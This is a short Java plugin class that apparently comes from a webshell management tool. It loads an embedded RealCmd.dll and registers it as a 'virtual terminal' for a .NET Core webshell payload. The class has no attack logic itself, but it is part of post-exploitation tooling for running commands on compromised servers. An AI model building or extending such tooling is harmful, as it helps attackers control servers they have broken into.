package shells.plugins.netcore;

import core.annotation.PluginAnnotation;
import shells.plugins.generic.RealCmd;
import util.functions;

@PluginAnnotation(
        payloadName = "NetCoreDynamicPayload",
        Name = "RealCmd",
        DisplayName = "\u865a\u62df\u7ec8\u7aef"
)
public class NRealCmd extends RealCmd {
    private static final String CLASS_NAME = "RealCmd.Run";

    public NRealCmd() {
    }

    public byte[] readPlugin() {
        return functions.readInputStreamAutoClose(NRealCmd.class.getResourceAsStream("assets/RealCmd.dll"));
    }

    public String getClassName() {
        return CLASS_NAME;
    }
}
